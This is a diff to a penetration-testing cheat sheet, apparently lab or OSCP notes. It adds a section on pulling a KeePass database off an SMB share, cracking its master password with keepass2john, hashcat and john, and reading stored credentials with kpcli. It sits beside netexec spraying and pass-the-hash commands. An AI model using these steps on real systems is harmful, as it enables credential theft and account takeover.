@@ -1924,6 +1924,25 @@ netexec <protocol> <target(s)> -u username1 -p password1 password2
 netexec <protocol> <target(s)> -u ~/file_containing_usernames -H ~/file_containing_ntlm_hashes
 sudo nxc smb <TARGET> -k -u USER -p PASS
 ```
+### kpcli - keepass massword manager
+Found the Database.kdbx file in the smb enumeration
+```
+smbclient -L \\<TARGET>
+smb shell> smb: \DB-back (1)\New Folder\Emma\Documents\> get Database.kdbx
+keepass2john Database.kdbx > keepass.hash
+hashcat -m 13400 keepass.hash  /home/kali/HTB/OSCP/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule (#Password - welcome)
+john keepass.hash(#Password - welcome)
+```
+Cracking the Kdbx file with kpcli
+```
+>kpcli --kdb=Database.kdbx (#Password - welcome)
+>ls
+>cd Databases
+>cd Windows
+>show emma
+#Password show in hide RED, select with mouse it will unhide multiple times. 
+```
+
 ### Pass the ticket
 
 ```powershell
